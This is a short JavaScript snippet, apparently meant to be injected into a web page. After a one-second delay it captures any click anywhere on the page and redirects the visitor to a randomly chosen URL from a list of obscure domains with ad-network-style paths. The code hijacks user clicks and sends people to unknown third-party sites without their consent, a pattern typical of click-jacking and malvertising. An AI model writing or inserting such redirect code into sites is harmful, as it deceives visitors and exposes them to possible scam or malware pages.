function init() {
  var arr = [
    // mon: Lucy
    // "https://kaushichie.net/4/7683316",
    "https://grapseex.com/4/7683319",
    "https://nawhaurgoas.com/4/7683320",
    "https://zaltaumi.net/4/7683322",
    "https://gouthishoust.net/4/7683324",

    // "https://stongoapti.net/4/7683326",
    // "https://psaurdard.net/4/7683327",
    // "https://megroarsoy.net/4/7683328",
    // "https://thaudray.com/4/7683329",
    "https://psaupteer.net/4/7683330",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 5000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 1000);